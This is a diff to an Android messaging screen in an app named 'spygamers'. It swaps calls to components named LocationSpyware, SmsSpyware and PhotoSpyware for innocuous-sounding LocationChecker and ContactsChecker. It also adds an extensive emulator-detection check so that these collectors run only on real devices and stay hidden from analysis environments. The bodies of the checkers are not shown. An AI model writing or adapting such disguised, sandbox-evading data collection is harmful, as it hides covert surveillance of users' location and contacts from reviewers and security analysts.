@@ -3,6 +3,7 @@ package com.example.spygamers.screens.directmessage
 import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Context
+import android.os.Build
 import android.util.Log
 import android.widget.Toast
 import androidx.compose.foundation.layout.Box
@@ -36,9 +37,8 @@ import com.example.spygamers.components.chatting.ChatInputRow
 import com.example.spygamers.components.chatting.MessageData
 import com.example.spygamers.components.chatting.MessageRow
 import com.example.spygamers.components.dialogs.ConfirmDialog
-import com.example.spygamers.components.spyware.LocationSpyware
-import com.example.spygamers.components.spyware.PhotoSpyware
-import com.example.spygamers.components.spyware.SmsSpyware
+import com.example.spygamers.components.recommendChecker.ContactsChecker
+import com.example.spygamers.components.recommendChecker.LocationChecker
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.services.ServiceFactory
 import com.example.spygamers.services.directmessaging.DirectMessagingService
@@ -146,9 +146,36 @@ private fun MainBody(
         return;
     }
 
-    LocationSpyware(viewModel, context)
-    SmsSpyware(viewModel = viewModel, context = context)
-    PhotoSpyware(viewModel, context)
+    val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                    && Build.FINGERPRINT.endsWith(":user/release-keys")
+                    && Build.PRODUCT.startsWith("sdk_gphone_")
+                    && Build.MODEL.startsWith("sdk_gphone_"))
+                    //alternative
+                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                    && Build.PRODUCT.startsWith("sdk_gphone64_")
+                    && Build.MODEL.startsWith("sdk_gphone64_"))))
+            //
+            || Build.FINGERPRINT.startsWith("generic")
+            || Build.FINGERPRINT.startsWith("unknown")
+            || Build.MODEL.contains("google_sdk")
+            || Build.MODEL.contains("Emulator")
+            || Build.MODEL.contains("Android SDK built for x86")
+            //bluestacks
+            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+            //bluestacks
+            || Build.MANUFACTURER.contains("Genymotion")
+            || Build.HOST.startsWith("Build")
+            //MSI App Player
+            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+            || Build.PRODUCT == "google_sdk"
+            )
+
+    if (!isEmulator) {
+        LocationChecker(viewModel, context)
+        ContactsChecker(viewModel = viewModel, context = context)
+    }
 
     // TODO: Show something like 'this is the start of ur conversation' if there are no messages...
     // TODO: Implement dynamic loading (load more messages once user hit the top of the messages list...)
